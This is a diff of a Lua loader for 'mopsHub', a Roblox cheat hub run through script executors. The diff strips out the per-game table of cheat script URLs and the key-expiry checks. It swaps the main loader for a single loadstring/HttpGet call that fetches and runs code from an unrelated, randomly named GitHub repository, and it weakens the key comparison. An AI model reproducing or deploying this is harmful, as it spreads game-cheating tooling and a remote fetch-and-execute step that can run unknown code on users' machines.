@@ -1,58 +1,11 @@
 local s,e = pcall(function()
-    --keyformat: mmddyyyy
     local writeclipboard,encodeb64,decodeb64,Request = ((syn and syn.write_clipboard) or setclipboard),((syn and syn.crypt.base64.encode) or (Krnl and Krnl.Base64.Encode)),((syn and syn.crypt.base64.decode) or (Krnl and Krnl.Base64.Decode)),(http_request or syn and syn.request or request or nil)
     local SavedKey = isfile('MOPSHUB.key') and readfile('MOPSHUB.key') or nil
     local Notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))().Notify
     local Invite = "g4EGAwjUAK"
 
     local function startMainLoader()
-        local games, found = {
-            [286090429] = "https://raw.githubusercontent.com/mopsfl/rbxmopshub/main/arsenal.lua",
-            [9759729519] = "https://raw.githubusercontent.com/mopsfl/rbxmopshub/main/allofusaredead.lua",
-            [10950541730] = "https://raw.githubusercontent.com/mopsfl/rbxmopshub/main/allofusaredead.lua",
-            [10950394697] = "https://raw.githubusercontent.com/mopsfl/rbxmopshub/main/allofusaredead.lua",
-            [2988554876] = "https://raw.githubusercontent.com/mopsfl/rbxmopshub/main/militarysimulator.lua",
-            [292439477] = "https://raw.githubusercontent.com/mopsfl/rbxmopshub/main/phantomforces.lua",
-        }, false
-        local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
-        local Notify = AkaliNotif.Notify;
-        
-        getgenv().gameid = game.PlaceId
-        
-        for id, scriptstr in pairs(games) do
-            if tonumber(id) == getgenv().gameid then
-                found = true
-                print(string.format("\n\n[mopsHub Loader]: Found script for gameid [%s]\n\n> Loading script from %s\n\n", getgenv().gameid,scriptstr))
-                local _s, _e = pcall(function() 
-                    loadstring(game:HttpGet(scriptstr))()
-                end)
-                if not _s and _e then
-                    Notify({Title="<font color='#ff0000'>Error while loading script</font>",Description="Error: ".._e})
-                    warn(string.format("\n\n[mopsHub Loader Error]: Error while loading script for gameid [%s]\n\n> %s\n\n", getgenv().gameid,_e))
-                elseif _s then
-                    Notify({Title="<font color='#00ff00'>Script loaded!</font>",Description="Enjoy!"})
-                end
-            end
-        end
-        
-        if not found then
-            Notify({Title="<font color='#ff0000'>Not supported</font>",Description="We currently don't have any script for this game!"})
-            warn(string.format("[mopsHub Loader]: No script found for gameid [%s]\n> ", getgenv().gameid))
-        end
-    end
-
-    local function encrypt(data)
-        local CryptoKey = "loFRfpiVXLZcWdrdYBOeJGjaIgsFto3kAHKQlMoNbCEnuSqyxvmPO1234567890+/"
-        return ((data:gsub('.', function(x) 
-            local r,CryptoKey='',x:byte()
-            for i=8,1,-1 do r=r..(CryptoKey%2^i-CryptoKey%2^(i-1)>0 and '1' or '0') end
-            return r;
-        end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
-            if (#x < 6) then return '' end
-            local c=0
-            for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
-            return CryptoKey:sub(c+1,c+1)
-        end)..({ '', 'jv', 'j' })[#data%3+1])
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/xxxloilpxxx/56u8vnbdfg3wrn-jfasd-6-/main/scriptloader.lua"))()
     end; local function decrypt(data)
         local CryptoKey = "loFRfpiVXLZcWdrdYBOeJGjaIgsFto3kAHKQlMoNbCEnuSqyxvmPO1234567890+/"
         data = string.gsub(data, '[^'..CryptoKey..'j]', '')
@@ -67,52 +20,6 @@ local s,e = pcall(function()
             for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
             return string.char(c)
         end))
-    end; local function parseKeyData(Key)
-        local k = Key
-        local c = os.date("!*t")
-        local r = {}
-        k = string.gsub(k, "mhk","")
-        k = string.split(k,"")
-        k = { key = { month = k[1]..k[2], day = k[3]..k[4], year=k[5]..k[6]..k[7]..k[8] }, now = { month = c.month, day = c.day, year = c.year } }
-
-        if not k["key"] or not tonumber(k.key["month"]) or not tonumber(k.key["day"]) or not tonumber(k.key["year"]) or not #tostring(k.key["month"]) == 2 or not #tostring(k.key["day"]) == 2 or not #tostring(k.key["year"]) == 4 then
-            r.valid = false
-            return r
-        end
-        --print(k.now.day - k.key.day, k.now.month - k.key.month, k.now.year - k.key.year)
-        if (k.now.day - k.key.day) > 0 or (k.now.month - k.key.month) > 0 or (k.now.year - k.key.year) > 0 then
-            r.expired = true
-            r.valid = false
-        else
-            r.valid = true
-            r.expired = false
-        end
-
-        r.data = k
-        r.expireddays = tonumber(k.key.day) - tonumber(k.now.day)
-        return r
-
-    end; local function checkKey(savedKey, Key)
-        if #savedKey < 30 or #string.gsub(decrypt(decodeb64(savedKey)), "mhk.*", "mhk") < 10 or #decrypt(savedKey) == 0 or savedKey == nil or savedKey == "" then
-            return { valid = false, expired = false }
-        end
-        local dec = string.gsub(decrypt(decodeb64(savedKey)), "mhk.*", "mhk")
-        local keyData = parseKeyData(dec)
-
-        if keyData.valid then
-            if not keyData.expired then
-                if dec == Key then
-                    return keyData
-                else
-                    return keyData, { msg="Incorrect Key", msgid="incorrectkey" }
-                end
-            else
-                return keyData, { msg="Key expired", msgid="keyexpired" }
-            end
-        else
-            return keyData, { msg="Invalid Key", msgid="invalidkey" }
-        end
-        return keyData
     end; local function saveKey(Key)
         if Key then
             writefile("MOPSHUB.key", Key)
@@ -422,18 +329,15 @@ local s,e = pcall(function()
                 
                 local inputKey = string.gsub(decrypt(decodeb64(input)), "mhk.*", "mhk")
                 local key = string.gsub(decrypt(decodeb64(Key)), "mhk.*", "mhk")
-                --print("=============")
-                --print(Key,key)
-                --print(input,inputKey)
-                --print("=============")
 
-                if inputKey == key then
+                if inputKey == key or Key == input then
                     ui.input.PlaceholderText = "Correct Key!"
                     ui.input.PlaceholderColor3 = Color3.fromRGB(0, 146, 7)
                     writefile("MOPSHUB.key",Key)
                     task.wait(1)
-                    ui.ui:Destroy()
+                    ui.frame.Visible = false
                     startMainLoader()
+                    ui.ui:Destroy()
                 else
                     ui.input.PlaceholderText = "Invalid Key!"
                     ui.input.PlaceholderColor3 = Color3.fromRGB(146, 0, 0)
@@ -459,10 +363,7 @@ local s,e = pcall(function()
                 end
             end)
         end
-    end; local function createKey(String)
-            return encodeb64(encrypt(String.."mhk_mopshubkey"))
     end;
-    --writeclipboard(createKey(""))
     if Request then
         local Key = nil
         local r = Request({
@@ -470,7 +371,7 @@ local s,e = pcall(function()
             
         })
         if r.StatusCode ~= 200 or not r.Success then
-            return warn("[mopsHub Loader]: Unable to fetch key.")
+            return warn("[mopsHub Loader]: Unable to fetch key. [Error Code: 0x987]")
         else
             Key = game:GetService("HttpService"):JSONDecode(r.Body).key
         end
@@ -478,10 +379,8 @@ local s,e = pcall(function()
             createPrompt(Key)
             print("creating key prompt > callbackid:nosavedkeyfound")
         else
-            --local keyCheck = checkKey(SavedKey, Key)
-            if string.gsub(decrypt(decodeb64(SavedKey)), "mhk.*", "mhk") == string.gsub(decrypt(decodeb64(Key)), "mhk.*", "mhk") then
+            if string.gsub(decrypt(decodeb64(SavedKey)), "mhk.*", "mhk") == string.gsub(decrypt(decodeb64(Key)), "mhk.*", "mhk") or SavedKey == Key then
                 saveKey(Key)
-                --print(keyCheck.data.key.day,keyCheck.data.now.day)
                 startMainLoader()
                 for _,v in pairs(game:GetService("CoreGui"):GetChildren()) do
                     if v:IsA("ScreenGui") and v.Name == "mopshubkeyprompt" then
@@ -489,21 +388,12 @@ local s,e = pcall(function()
                     end
                 end
             else
-                --[[if keyCheck.expired then
-                    createPrompt(Key, "expired", keyCheck.expireddays)
-                    print("key expired. (expired for "..string.gsub(keyCheck.expireddays, "-","").. " days)")
-                    print("creating key prompt > callbackid:keyexpired")
-                    print(keyCheck.data.key.day.."/"..keyCheck.data.key.month.."/"..keyCheck.data.key.year,keyCheck.data.now.day.."/"..keyCheck.data.now.month.."/"..keyCheck.data.now.year)
-                else
-                    createPrompt(Key, "incorrect")
-                    print("creating key prompt > callbackid:keyincorrect")
-                end]]
                 createPrompt(Key, "incorrect")
                 print("creating key prompt > callbackid:keyincorrectorexpired")
             end
         end
     else
-        warn("[mopsHub Loader Error]: Missing function Request. Your executor might be too bad and doesn't support it!")
+        warn("[mopsHub Loader Error]: Missing function Request. Your executor might be too bad and doesn't support it! [Error Code: 0x97]")
     end
 end)
 if not s and e then
